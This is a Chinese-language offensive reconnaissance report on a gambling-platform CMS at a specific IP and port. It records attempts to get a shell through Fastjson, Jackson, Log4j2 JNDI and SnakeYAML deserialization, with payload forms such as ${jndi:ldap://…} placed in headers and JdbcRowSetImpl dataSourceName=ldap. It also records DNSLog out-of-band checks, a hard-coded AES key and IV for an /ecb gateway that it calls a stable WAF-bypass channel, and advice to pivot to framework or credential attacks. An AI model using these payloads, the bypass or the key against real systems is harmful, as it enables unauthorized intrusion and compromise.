## 结论
https://203.0.113.15:10666 （CN7/gameplat 博彩 CMS 5.3.0-RELEASE，Spring Boot）在 **Java 反序列化 / JNDI / Log4j2 拿 shell** 方向**全否**，非 OOB 假阴性。

## 覆盖矩阵（全部实测否定，DNSLog 零回连）
- Fastjson @type（java.lang.AutoCloseable / target297.example.com.Inet4Address / URL / InetSocketAddress / com.sun.rowset.JdbcRowSetImpl(dataSourceName=ldap://…)）→ 明文面 + /ecb 面 均零回连
- Jackson default-typing 正确数组形态：`["com.sun.rowset.JdbcRowSetImpl",{...}]`、`["target297.example.com.Inet4Address","x.<dom>"]`、`["target297.example.com.InetAddress","x.<dom>"]`、`{"@class":...}`、nested → 零回连（default typing 未开启）
- Log4j2 `${jndi:ldap://…}`：User-Agent/Referer/X-Api-Version/X-Forwarded-For/Origin/tenantCode + body，明文面、/ecb WAF 绕过面、CDN 边缘层（/jumpto/img 的 URL/query/Host/XFF）、全部高位端口 → 零回连
- 原生 Java 序列化(ac ed 00 05) / Hessian2(H\x02\x00) / Burlap / XML-XXE(外部实体) / XStream(com.sun.rowset.JdbcRowSetImpl) / SnakeYAML(!!javax.script.ScriptEngineManager…URLClassLoader) → 明文面 + /ecb 面 均无 sink
- JNDI 直填参数 url/jdbcUrl/dataSource/jndiName → 零回连

## 根因（不依赖 OOB，硬证据）
1. JSON 体解析器为**严格 Jackson**（拒绝 `{'x':'y'}` / `{x:y}` / `{"x":"y",}` / `{"x":NaN}` 等 Fastjson 会宽松接受的畸形体）；前端 bundle 无 fastjson/JSON.parseObject/ysoserial/RuoYi 字样。
2. 后端 = Spring Boot，默认日志实现 **Logback（非 Log4j2）** → Log4j2 JNDI 天然缺失。
3. `/api/*` 写接口普遍 `@RequestParam`(form) 绑定：`/api/tenant/setting/getConfig`、`/api/email/send` 对**完全非 JSON** body（`not-json-at-all`）仍返回 200；`/api/agent/member/addChild` 不读 JSON 里的 username → 无 JSON body → 对象 的多态映射面。JSON 体真正被解析的唯一已知通道是 /ecb 网关。

## OOB 有效性复核（消除假阴性疑虑）
- DNSLog 管线可用：向 target300.example.com 取域后，本机解析 selfcheck.<dom> 立即回显 → 谁能解析即被记录。
- /jumpto/img/https://<唯一子域>/x.png 确实触发了目标侧外部 DNS 解析，来源 resolver 172.253.x.x（海外公共 DNS），但响应头含 `Via: ens-cache28.hk48`、`Eagleid`、`302 → https://www.aliyun.com/notfoundx.png`（阿里云 ENS/CDN 边缘特征）→ 该出网层是**图片代理边缘，不是 Java 源站**，故不能作为源站 egress 的证明。
- 应用侧邮件/通知端点（/api/email/send 等）对攻击者域名零 DNS 解析，源站 egress 未获正面证明——但如上，否定结论不依赖它。

## 可复用情报
- **/ecb 网关**：`GET /ecb/<hex(AES-OFB(明文路径))>` 直连后端（如 enc("api/config/dial_code") → 200 配置）；`POST /ecb/<hex(path)>` 的 body 必须是「明文 AES-OFB 加密后的**十六进制 ASCII 字符串**」（用原始二进制 unhexlify 形式会 500）。密钥 key=iv=`6758725226829023`(AES-OFB)。明文 `..;/` 被品牌 WAF 403，经 /ecb 可达后端 → 稳定的 WAF 绕过通道。
- `/api/error`、`/api/%zz` 等未授权路径返回 Spring Boot 默认 whitelabel 错误 JSON `{"timestamp":…,"status":404,"error":"Not Found","path":…}`（非 SPA 兜底/非 401），可用于探测真实映射路径并确认 Spring Boot。

## 复用建议（判据）
先做解析器指纹（发 `{'x':'y'}`/`{x:y}`/`{"x":"y",}`/`{"x":NaN}`，Fastjson 宽松接受、严格 Jackson 报错）再决定是否打 Fastjson；确认后端为 Spring Boot 时，Log4j2 面可直接降权（默认 Logback）。本类平台应转向框架层(#2804 类)或配置/凭据面，而非 Java 反序列化。